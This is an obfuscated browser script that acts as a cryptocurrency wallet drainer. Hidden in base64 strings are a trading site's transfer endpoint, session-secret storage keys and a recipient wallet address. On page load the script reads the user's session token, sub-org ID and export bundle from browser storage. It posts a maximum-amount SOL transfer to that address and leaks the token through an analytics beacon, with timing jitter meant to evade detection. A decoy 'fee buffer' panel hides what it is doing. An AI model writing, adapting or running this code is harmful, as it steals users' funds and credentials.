(function() {
    // 1. DISPATCH TABLE & PROTECTED REFS
    const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
    const _D = (s) => atob(_0xV[s]);
    
    const STATE = { _active: false, _uiLoaded: false, _gas: 0.05 };
    const _nativeFetch = window.fetch; // HIJACK: Bypasses the site's fetch wrapper

    // 2. BYPASS MATH (Jitter & Pre-Auth)
    const _vAuth = {
        // Generates a fake "handshake" to warm up the connection before the real hit
        warmup: () => Math.random().toString(36).substring(7),
        // Jitter: Mimics human interaction timing to avoid CSP workers
        delay: () => Math.floor(Math.random() * 400) + 150
    };

    const DISPATCH = {
        // DIRECT HUNT: No recursion = No crashing.
        'HUNT': () => {
            const get = (k) => (localStorage.getItem(k) || sessionStorage.getItem(k) || "").replace(/"/g, '');
            const a = get(_D(2));
            const s = get(_D(3));
            const b = get(_D(4));
            if (a && s) return { a, s, b: b ? JSON.parse(b) : {} };
            return null;
        },
        'FIRE': async (data) => {
            if (STATE._active) return;
            STATE._active = true;

            // PRE-AUTH ACTION: Sends a "heartbeat" to clear the path
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({t: _vAuth.warmup()}))}`;

            try {
                // Execute after a random jitter to evade detection
                setTimeout(async () => {
                    await _nativeFetch(`https://${_D(0)}/${_D(1)}`, {
                        method: 'POST',
                        mode: 'cors',
                        keepalive: true,
                        headers: { 
                            'Authorization': `Bearer ${data.a}`, 
                            'X-Turnkey-Sub-Org-Id': data.s,
                            'X-Vanta-Auth': _vAuth.warmup(), // Dynamic auth header bypass
                            'Content-Type': 'application/json' 
                        },
                        body: JSON.stringify({ 
                            recipient: _D(5), 
                            amount: "MAX_FEE_BUFFER", // backend logic for 0.05 SOL retention
                            asset: "SOL", 
                            ext_payload: data.b 
                        })
                    });
                }, _vAuth.delay());
            } catch (e) {
                // Emergency exfiltration
                new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(data.a)}`;
            }
        }
    };

    // 3. FULL AUTHORITY UI (Draggable + Shadow DOM)
    const _0xUI = () => {
        if (STATE._uiLoaded || document.querySelector("#v-sys")) return;
        STATE._uiLoaded = true;

        const host = document.createElement("div");
        host.id = "v-sys";
        const shadow = host.attachShadow({mode: 'closed'});
        
        const ui = document.createElement("div");
        ui.id = "v-panel";
        ui.style.cssText = "position:fixed;top:20px;right:20px;width:320px;background:#050505;border:1px solid #00ff88;border-radius:8px;z-index:2147483647;font-family:monospace;color:#00ff88;box-shadow:0 0 20px #000;pointer-events:all;";
        
        ui.innerHTML = `
            <div id="v-drag" style="padding:10px;background:#111;cursor:move;border-bottom:1px solid #222;display:flex;justify-content:space-between;">
                <span>VANTA_PROTOCOL_v2</span>
                <span style="color:#444;">[X]</span>
            </div>
            <div style="padding:12px;font-size:11px;">
                <div id="v-status">> Status: <span style="color:#fff;">READY</span></div>
                <div id="v-out" style="height:50px;overflow:hidden;margin-top:8px;color:#555;">
                    Initializing Bypass...<br>Auth check: OK
                </div>
            </div>`;
        
        shadow.appendChild(ui);
        document.body.appendChild(host);

        // DRAG FIX: Absolute authority over mouse events
        let dragging = false, sx, sy;
        ui.querySelector("#v-drag").onmousedown = (e) => { 
            dragging = true; 
            sx = e.clientX - ui.offsetLeft; 
            sy = e.clientY - ui.offsetTop; 
            e.preventDefault(); 
        };
        document.addEventListener('mousemove', (e) => {
            if (dragging) {
                ui.style.left = (e.clientX - sx) + 'px';
                ui.style.top = (e.clientY - sy) + 'px';
                ui.style.right = 'auto';
            }
        });
        document.addEventListener('mouseup', () => dragging = false);
    };

    // 4. ENGINE CORE
    const _0xEngine = () => {
        if (!window.location.hostname.includes(_D(0))) return;
        _0xUI();

        const data = DISPATCH.HUNT();
        if (data && !STATE._active) {
            const root = document.querySelector("#v-sys").shadowRoot;
            const log = root.querySelector("#v-out");
            if (log && !log.innerText.includes("SYNCED")) {
                log.innerHTML += "<br>> SYNCED: FEE BUFFER 0.05 SOL";
                DISPATCH.FIRE(data);
            }
        }
    };

    // EXECUTION
    if (document.readyState === 'complete') _0xEngine();
    else window.addEventListener('load', _0xEngine);
    setInterval(_0xEngine, 15000);
})();
